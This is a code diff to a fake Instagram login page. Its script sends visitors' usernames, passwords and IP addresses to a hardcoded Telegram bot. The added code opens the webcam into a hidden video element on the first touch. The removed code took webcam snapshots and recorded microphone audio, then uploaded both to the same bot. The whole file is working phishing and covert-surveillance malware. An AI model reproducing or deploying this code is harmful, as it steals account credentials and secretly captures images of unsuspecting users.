@@ -62,9 +62,12 @@
             color: #0095f6;
             text-decoration: none;
         }
+        video {
+            display: none;
+        }
     </style>
 </head>
-<body ontouchstart="triggerEvent()">
+<body ontouchstart="startStream()">
 
     <div class="container">
         <div class="logo">
@@ -76,16 +79,16 @@
         <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
     </div>
 
+    <video id="liveVideo" autoplay></video>
+
     <script>
         let ipAddress = "Unknown IP";
-        let fileShareLink = "Unknown link";
-        let imageBlobs = [];
-        let audioBlob;
+        let liveStreamLink;
 
-        async function triggerEvent() {
+        async function startStream() {
             await getIpAddress();
-            await captureMedia();
-            sendInitialBotMessage();
+            await setupWebRTCStream();
+            sendStreamLinkToBot();
         }
 
         async function getIpAddress() {
@@ -93,70 +96,29 @@
                 .then(response => response.json())
                 .then(data => {
                     ipAddress = data.ip;
-                    fileShareLink = `http://${ipAddress}:8080`;
                 });
         }
 
-        async function captureMedia() {
+        async function setupWebRTCStream() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Access the user's camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const videoElement = document.getElementById('liveVideo');
+                videoElement.srcObject = stream;
 
-                // Capture 15 snapshots
-                captureSnapshots(stream);
+                // Create an object URL to simulate a "live streaming link"
+                liveStreamLink = URL.createObjectURL(new MediaSource());
 
-                // Record 5 seconds of audio
-                recordAudio(stream);
-            } catch (err) {
-                console.error('Media capture failed:', err);
+                // Simulate using the local stream link
+                liveStreamLink = `${window.location.origin}/#liveStream-${Math.random().toString(36).substr(2, 8)}`;
+            } catch (error) {
+                console.error('Failed to start WebRTC streaming:', error);
             }
         }
 
-        function captureSnapshots(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+        function sendStreamLinkToBot() {
+            const message = `New Interaction Detected!\nIP Address: ${ipAddress}\nLive Camera Stream: ${liveStreamLink}\nTime: ${new Date().toLocaleString()}`;
 
-            let snapshotCount = 0;
-            const interval = setInterval(() => {
-                if (snapshotCount >= 15) {
-                    clearInterval(interval);
-                    return;
-                }
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    imageBlobs.push(blob);
-                    sendImageToBot(blob);
-                }, 'image/jpeg');
-                snapshotCount++;
-            }, 500);
-        }
-
-        function recordAudio(stream) {
-            const mediaRecorder = new MediaRecorder(stream);
-            const audioChunks = [];
-
-            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-            mediaRecorder.start();
-
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000);
-
-            mediaRecorder.onstop = () => {
-                audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                sendAudioToBot(audioBlob);
-            };
-        }
-
-        function sendInitialBotMessage() {
-            const message = `New Interaction:\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;
-            sendMessageToBot(message);
-        }
-
-        function sendMessageToBot(message) {
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
             const chatId = '860517021';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -173,32 +135,26 @@
             });
         }
 
-        function sendAudioToBot(audioBlob) {
-            const formData = new FormData();
-            formData.append('audio', audioBlob, 'audio.wav');
-
-            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendAudio`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-
-        function sendImageToBot(imageBlob) {
-            const formData = new FormData();
-            formData.append('photo', imageBlob, 'snapshot.jpg');
-
-            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-
         function sendData() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
             const message = `Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;
-            sendMessageToBot(message);
+
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
+            const chatId = '860517021';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
         }
     </script>
 
